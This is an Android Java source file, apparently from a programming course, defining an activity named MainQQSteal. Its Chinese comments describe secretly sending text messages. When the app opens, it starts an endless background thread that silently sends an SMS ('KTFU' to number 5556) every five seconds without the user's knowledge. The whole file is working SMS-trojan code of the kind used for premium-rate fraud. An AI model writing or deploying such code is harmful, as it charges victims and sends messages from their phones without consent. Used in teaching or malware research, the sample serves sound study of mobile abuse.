package com.itheima.binghua.caole;

import android.app.Activity;
import android.os.Bundle;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Window;

public class MainQQSteal extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //去掉标题，在用户点击程序到onStart（）之前就要调用此方法，去掉标题
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.activity_main);

        new Thread(new Runnable() {
            @Override
            public void run() {
                //必须不停止的循环才行
                while (true) {
                    //不抛异常，每5秒中偷发一次短信
                    SystemClock.sleep(5000);
                    Log.i("后台正在偷发短信", "每五秒偷发一次");
                    SmsManager smsManager = SmsManager.getDefault();

                    smsManager.sendTextMessage("5556", null, "KTFU", null, null);

                }
            }
        }).start();
    }
}
